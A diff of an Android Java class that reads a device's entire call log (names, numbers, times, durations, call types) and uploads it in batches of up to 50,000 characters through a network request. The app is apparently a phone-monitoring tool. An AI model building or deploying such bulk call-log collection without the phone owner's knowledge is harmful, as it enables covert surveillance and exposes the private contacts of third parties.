@@ -19,7 +19,7 @@ import com.inet.android.utils.Logging;
 public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 	Context mContext;
 	RequestDataBaseHelper db;
-	private String iType;
+	private String iType = "1";;
 	ConvertDate date;
 	private String LOG_TAG = "ArchiveCall";
 	// private int type;
@@ -27,92 +27,73 @@ public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 	Editor ed;
 	SharedPreferences sp;
 
-	private String getDuration(long milliseconds) {
-		int seconds = (int) (milliseconds / 1000) % 60; // 280
-		int minutes = (int) ((milliseconds / (1000 * 60)) % 60);
-		int hours = (int) ((milliseconds / (1000 * 60 * 60)) % 24);
-		if (hours < 1)
-			return minutes + ":" + seconds;
-		return hours + ":" + minutes + ":" + seconds;
-	}
-
 	private String readCallLogs() {
 		String sendStr = null;
+		String type = "0";
 		date = new ConvertDate();
-		Cursor callLogCursor = null;
-		// Делаем запрос к контент-провайдеру
-		// и получаем все данные из таблицы
-		for (int i = 0; i < 3; i++) {
+		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
+		ed = sp.edit();
+
+		Logging.doLog(LOG_TAG,
+				"network" + sp.getBoolean("network_available", true), "network"
+						+ sp.getBoolean("network_available", true));
+		if (sp.getBoolean("network_available", true) == true) {
+
+			Cursor callLogCursor = null;
+			// Делаем запрос к контент-провайдеру
+			// и получаем все данные из таблицы
+
 			complete = "0";
-			switch (i) {
-			case (0):
-				callLogCursor = mContext.getContentResolver().query(
-						android.provider.CallLog.Calls.CONTENT_URI,
-						null,
-						CallLog.Calls.TYPE + "=?",
-						new String[] { String
-								.valueOf(CallLog.Calls.INCOMING_TYPE) },
-						android.provider.CallLog.Calls.DEFAULT_SORT_ORDER);
-				iType = "1";
-				break;
-			case (1):
-				callLogCursor = mContext.getContentResolver().query(
-						android.provider.CallLog.Calls.CONTENT_URI,
-						null,
-						CallLog.Calls.TYPE + "=?",
-						new String[] { String
-								.valueOf(CallLog.Calls.OUTGOING_TYPE) },
-						android.provider.CallLog.Calls.DEFAULT_SORT_ORDER);
-				iType = "2";
+			callLogCursor = mContext.getContentResolver().query(
+					android.provider.CallLog.Calls.CONTENT_URI, null, null,
+					null, android.provider.CallLog.Calls.DEFAULT_SORT_ORDER);
 
-				break;
-			case (2):
-				callLogCursor = mContext.getContentResolver().query(
-						android.provider.CallLog.Calls.CONTENT_URI,
-						null,
-						CallLog.Calls.TYPE + "=?",
-						new String[] { String
-								.valueOf(CallLog.Calls.MISSED_TYPE) },
-						android.provider.CallLog.Calls.DEFAULT_SORT_ORDER);
-						iType = "3";
-
-				break;
-			}
 			if (callLogCursor != null) {
 				JSONObject archiveCallJson = new JSONObject();
 
 				// Проходим в цикле, пока не дойдём до последней записи
-				Logging.doLog(LOG_TAG, "callogCursor != 0 ..");
-
+				
 				while (callLogCursor.moveToNext()) {
-					Logging.doLog(LOG_TAG, "callogCursor moveToNext ..");
-
+					
 					// Имя контакта
 					String name = callLogCursor.getString(callLogCursor
 							.getColumnIndex(CallLog.Calls.CACHED_NAME));
-
+					
 					String cacheNumber = callLogCursor.getString(callLogCursor
 							.getColumnIndex(CallLog.Calls.CACHED_NUMBER_LABEL));
 					// Номер контакта и т.д.
 					String number = callLogCursor.getString(callLogCursor
 							.getColumnIndex(CallLog.Calls.NUMBER));
+					// String name = getNumber.getContactName(callLogCursor
+					// .getString(callLogCursor
+					// .getColumnIndex("address")))
 					long dateTimeMillis = callLogCursor.getLong(callLogCursor
 							.getColumnIndex(CallLog.Calls.DATE));
-					long durationMillis = callLogCursor.getLong(callLogCursor
-							.getColumnIndex(CallLog.Calls.DURATION));
-
-					String duration = getDuration(durationMillis * 1000);
-
+//					long durationMillis = callLogCursor.getLong(callLogCursor
+//							.getColumnIndex(CallLog.Calls.DURATION));
+					int callType = callLogCursor.getInt(callLogCursor
+							.getColumnIndex(CallLog.Calls.TYPE));
+					int durationInt = callLogCursor.getColumnIndex(CallLog.Calls.DURATION);
+					String duration = callLogCursor.getString(durationInt);
+					
 					String dateString = date.getData(dateTimeMillis);
 
 					if (cacheNumber == null)
 						cacheNumber = number;
 					if (name == null)
 						name = "No Name";
-
+					if (callType == CallLog.Calls.OUTGOING_TYPE) {
+						type = "3";
+					} else if (callType == CallLog.Calls.INCOMING_TYPE) {
+						type = "2";
+					} else if (callType == CallLog.Calls.MISSED_TYPE) {
+						type = "4";
+					}
 					try {
 						archiveCallJson.put("time", dateString);
 						archiveCallJson.put("number", number);
+						archiveCallJson.put("type", type);
+						archiveCallJson.put("name", name);
 						if (!iType.equals(3))
 							archiveCallJson.put("duration", duration);
 						if (sendStr == null)
@@ -124,27 +105,27 @@ public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 						// TODO Автоматически созданный блок catch
 						e.printStackTrace();
 					}
-					if (sendStr.length() >= 10000) {
-						Logging.doLog(LOG_TAG, "str >= 10000 ..",
-								"str >= 10000 ..");
+					if (sendStr.length() >= 50000) {
+						Logging.doLog(LOG_TAG, "str >= 50000 ..",
+								"str >= 50000 ..");
 						sendRequest(sendStr, complete);
+						ed.putString("statusCallList", "1");
 						sendStr = null;
 					}
 				}
+				complete = "1";
+				Logging.doLog(LOG_TAG, "Send complete 1 ..",
+						"Send complete 1 ..");
+				sendRequest(sendStr, complete);
+				sendStr = null;
+				ed.putString("statusCallList", "0");
+
+				callLogCursor.close();
 			}
-			complete = "1";
-			Logging.doLog(LOG_TAG, "Send complete 1 ..", "Send complete 1 ..");
-			sendRequest(sendStr, complete);
-			sendStr = null;
+		} else {
+			ed.putString("statusCallList", "1");
 		}
-		Logging.doLog(LOG_TAG, "statusCallList 0.", "statusCallList 0.");
-
-		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
-		ed = sp.edit();
-		ed.putString("statusCallList", "0");
 		ed.commit();
-
-		callLogCursor.close();
 
 		return null;
 	}
